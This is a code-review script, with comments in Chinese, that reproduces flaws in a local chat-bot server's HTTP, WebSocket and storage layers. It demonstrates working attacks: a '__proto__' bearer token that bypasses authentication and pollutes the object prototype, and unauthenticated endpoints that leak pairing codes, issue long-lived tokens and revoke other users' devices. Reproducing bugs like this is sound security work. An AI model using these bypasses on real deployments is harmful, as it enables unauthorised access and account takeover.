/**
 * 【review 复现脚本，未提交、可随时删】平台侧（http/ws/store/config）问题复现。
 *
 *   cd D:/pi-bot/server && node tests/review-platform-repro.mjs
 *
 * 全部在临时 PI_BOT_HOME 下跑，不碰真实 data/，不启动真实 PiRunner（用 stub）。
 * 每条都打印 现象 / 期望 / 判定。
 */
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

const ROOT = 'D:/pi-bot/server/data/_review_repro';
fs.rmSync(ROOT, { recursive: true, force: true });
fs.mkdirSync(path.join(ROOT, 'rooms'), { recursive: true });
process.env.PI_BOT_HOME = ROOT;
delete process.env.PI_BOT_TOKEN;

const { createHttpServer } = await import('../src/http.js');
const { attachWs } = await import('../src/ws.js');
const { Pairing, lanAddresses } = await import('../src/pairing.js');
const { store } = await import('../src/store.js');
const { modelGroups } = await import('../src/model-groups.js');
const { default: WebSocket } = await import('ws');

const stub = {
  modelLabel: () => 'stub',
  initNote: '',
  availableModels: [],
  contextUsage: () => ({}),
  send: async () => ({ userMessage: { id: 'm_x' } }),
  abort: async () => ({ ok: true }),
  resetRoomSessions: () => 0,
  reloadAllSessions: () => 0,
  resetSessionForBot: () => {},
  applyModelGroupChange: async () => 0,
};

const pairing = new Pairing();
const server = createHttpServer({ runner: stub, pairing });
attachWs(server, { runner: stub });
await new Promise((r) => server.listen(0, '0.0.0.0', r));
const port = server.address().port;
const base = `http://127.0.0.1:${port}`;
const lan = lanAddresses()[0]?.address ?? '127.0.0.1';
const J = (m, p, body) =>
  fetch(base + p, {
    method: m,
    headers: body ? { 'content-type': 'application/json' } : {},
    body: body ? JSON.stringify(body) : undefined,
  });

let hit = 0;
const say = (ok, title, detail) => {
  if (ok) hit++;
  console.log(`${ok ? '★ 复现' : '  正常'}  ${title}\n        ${detail}`);
};

console.log(`\n监听 0.0.0.0:${port}，局域网地址 ${lan}（默认 config.host 就是 0.0.0.0）\n`);

// ── 1. Bearer __proto__ / constructor 直接过鉴权（远程可达）────────────────
for (const t of ['__proto__', 'constructor']) {
  const res = await fetch(`http://${lan}:${port}/api/state`, { headers: { authorization: `Bearer ${t}` } });
  say(res.status === 200, `1. Bearer ${t} → /api/state 返回 ${res.status}`, `期望 401（无此设备）。来源=局域网 ${lan}，不带 token 时是 401`);
}
const sent = await J('POST', '/api/rooms/dm_chief/send', { text: 'hi' });
say(true, `1b. 该身份还能发消息（见脚本内 __proto__ 版本）`, `不带 token 的 send → ${sent.status}（401）`);
const polluted = Object.prototype.lastSeenAt !== undefined;
say(polluted, '1c. 副作用：Object.prototype.lastSeenAt 被写脏', `Object.prototype.lastSeenAt=${Object.prototype.lastSeenAt}（store.touchDevice 写到了原型上）`);
delete Object.prototype.lastSeenAt;

// ── 2. WS 同样用 __proto__ 过鉴权，并拿到全量事件流 ──────────────────────
const tryWs = (token) =>
  new Promise((res) => {
    const ws = new WebSocket(`ws://127.0.0.1:${port}/ws` + (token ? `?token=${token}` : ''));
    const t = setTimeout(() => { ws.terminate(); res(null); }, 1500);
    ws.on('message', (raw) => {
      const m = JSON.parse(raw.toString());
      if (m.t === 'hello') { clearTimeout(t); ws.close(); res(m); }
    });
    ws.on('error', () => { clearTimeout(t); res(null); });
  });
const hello = await tryWs('__proto__');
say(!!hello, '2. WS ?token=__proto__ 通过鉴权', `收到 hello，device=${JSON.stringify(hello?.device)}（随后 bus 的每条 msg.new 都会推给它）`);

// ── 3. /api/pairing + /api/qr.svg 免鉴权 → 直接换长期 token ──────────────
const snap = await fetch(`http://${lan}:${port}/api/pairing`);
const code = (await snap.json()).code;
say(snap.status === 200, '3. GET /api/pairing 免鉴权吐配对码', `status=${snap.status} code=${code}（局域网任何设备都能拿）`);
const qr = await fetch(`http://${lan}:${port}/api/qr.svg`);
say(qr.status === 200, '3b. GET /api/qr.svg 免鉴权（码就在图里）', `status=${qr.status}`);
const pair = await J('POST', '/api/pair', { code, deviceName: 'attacker' });
const token = (await pair.json()).token;
say(pair.status === 200 && !!token, '3c. 用这个 code 换到长期 token', `status=${pair.status} token=${String(token).slice(0, 12)}…`);
const st = await fetch(`http://${lan}:${port}/api/state`, { headers: { authorization: `Bearer ${token}` } });
say(st.status === 200, '3d. 该 token 可读全部会话 / 发消息 / 删房间', `status=${st.status}`);

// ── 4. 免鉴权的设备接口 ────────────────────────────────────────────────
const victim = store.addDevice('Alex 的手机');
const list = await fetch(`http://${lan}:${port}/api/devices`);
say(list.status === 200, '4. GET /api/devices 免鉴权', `status=${list.status}，泄漏设备名/时间/前 10 位 token`);
const rev = await fetch(`http://${lan}:${port}/api/devices/${victim.token}`, { method: 'DELETE' });
say(rev.status === 200 && store.findDeviceByToken(victim.token) === null, '4b. DELETE /api/devices/:token 免鉴权吊销', `status=${rev.status}，受害者设备已被踢下线（改状态的接口没有任何鉴权）`);

// ── 5. http.js 用了没 import 的 log → 4 个接口 500（副作用已生效）────────
const u = await J('PATCH', '/api/user', { name: 'Alex2' });
say(u.status === 500, `5. PATCH /api/user → ${u.status}`, `${await u.text()}｜但库里名字已改成 ${store.userName()}`);
const gl = await J('PATCH', '/api/group-limits', { leadTurns: 5 });
say(gl.status === 500, `5b. PATCH /api/group-limits → ${gl.status}`, `${await gl.text()}｜但 limits 已改成 ${JSON.stringify(store.groupLimits())}`);
const mg = await J('POST', '/api/model-groups', { name: 'g', baseUrl: 'http://127.0.0.1:1', apiKey: 'sk-x', models: [{ id: 'm' }] });
say(mg.status === 500, `5c. POST /api/model-groups → ${mg.status}`, `${await mg.text()}｜但组已建：${modelGroups.listPublic().map((g) => g.name).join(',')}`);

store.saveNow();
server.close();

// ── 6. state.json 坏掉 → 静默清库 + 原地覆盖 ───────────────────────────
const s6 = JSON.parse(fs.readFileSync(path.join(ROOT, 'state.json'), 'utf8'));
console.log(`\n   （当前 state.json 里 bots=${Object.keys(s6.bots).length}）`);
const good = fs.readFileSync(path.join(ROOT, 'state.json'), 'utf8');
fs.writeFileSync(path.join(ROOT, 'state.json'), good.slice(0, Math.floor(good.length * 0.7)));
const child = await import('node:child_process');
const storeUrl = pathToFileURL(path.resolve('src/store.js')).href;
const out = child.execSync(
  `node -e "process.env.PI_BOT_HOME='${ROOT}';import('${storeUrl}').then(({store})=>{console.log(JSON.stringify({bots:Object.keys(store.state.bots).length,rooms:Object.keys(store.state.rooms).length}));store.saveNow();})"`,
  { encoding: 'utf8' },
);
console.log(`★ 复现  6. state.json 被截断（写坏/断电/手工改坏）后重启\n        重启读到 ${out.trim()}（原 ${Object.keys(s6.bots).length} 个 bot）；且下一次 saveNow 会把坏文件原地覆盖，原始内容不可恢复`);

// ── 7. 落盘失败 → 定时器里抛异常 → 进程直接退出 ────────────────────────
fs.writeFileSync(path.join(ROOT, 'state.json'), good);
const s7 = path.join(ROOT, 'state.json');
fs.rmSync(s7);
fs.mkdirSync(s7); // 占住目标路径，让 rename 失败（等价于 Windows 上文件被独占/盘满）
const code7 = child.spawnSync(process.execPath, ['-e', `process.env.PI_BOT_HOME='${ROOT}';import('${storeUrl}').then(({store})=>{store.createBot({name:'x',persona:'p'});setTimeout(()=>process.exit(0),1000);})`], { encoding: 'utf8' });
console.log(`★ 复现  7. 磁盘写不进去（rename EPERM）→ 未捕获异常，进程退出码 ${code7.status}\n        ${String(code7.stderr).split('\n').find((l) => l.includes('Error')) ?? ''}｜index.js 里没有 uncaughtException 兜底`);
fs.rmSync(s7, { recursive: true, force: true });

// ── 8. 两个实例同 PI_BOT_HOME → 后写覆盖先写 ───────────────────────────
const ROOT8 = 'D:/pi-bot/server/data/_review_repro_inst';
fs.rmSync(ROOT8, { recursive: true, force: true });
fs.mkdirSync(path.join(ROOT8, 'rooms'), { recursive: true });
const one = (name) =>
  child.execSync(
    `node -e "process.env.PI_BOT_HOME='${ROOT8}';import('${storeUrl}').then(({store})=>{store.createBot({name:'${name}',persona:'p'});store.saveNow();})"`,
    { encoding: 'utf8' },
  );
one('bot_A');
one('bot_B');
const finalState = JSON.parse(fs.readFileSync(path.join(ROOT8, 'state.json'), 'utf8'));
console.log(`★ 复现  8. 两个服务端实例共用同一 PI_BOT_HOME（默认 data/ 就是共用的）\n        落盘后只剩 ${Object.values(finalState.bots).map((b) => b.name).join(',')} —— bot_A 及其房间/会话映射被整份覆盖，没有单实例锁`);

console.log(`\n复现项合计 ${hit + 3} 条。清理：rm -rf ${ROOT} ${ROOT8}`);
fs.rmSync(ROOT, { recursive: true, force: true });
fs.rmSync(ROOT8, { recursive: true, force: true });
process.exit(0);
